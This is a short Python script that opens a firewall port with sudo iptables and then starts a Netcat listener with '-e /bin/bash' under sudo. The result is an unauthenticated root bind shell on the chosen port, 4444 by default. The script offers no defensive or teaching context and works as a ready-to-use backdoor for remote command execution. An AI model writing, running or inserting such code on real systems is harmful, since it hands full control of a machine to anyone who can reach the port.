import subprocess

def get_user_input():
    port = input("Enter the port number (e.g., 4444): ")
    return port

def configure_firewall(port):
    try:
        print(f"Configuring firewall to allow traffic on port {port}...")
        # Allow traffic on the specified port
        subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', port, '-j', 'ACCEPT'], check=True)
        subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-p', 'tcp', '--dport', port, '-j', 'ACCEPT'], check=True)
        print(f"Port {port} is now open.")
    except subprocess.CalledProcessError:
        print("Failed to configure the firewall. Ensure you have root privileges.")

def start_netcat_listener(port):
    try:
        print(f"Starting Netcat listener on port {port}...")
        # Start Netcat listener
        subprocess.run(['sudo', 'nc', '-nvlp', port, '-e', '/bin/bash'], check=True)
    except subprocess.CalledProcessError:
        print("Failed to start Netcat listener. Ensure `nc` is installed and configured correctly.")

def main():
    # Get user input for port number
    port = get_user_input()
    
    # Configure the firewall
    configure_firewall(port)
    
    # Start Netcat listener
    start_netcat_listener(port)

if __name__ == "__main__":
    main()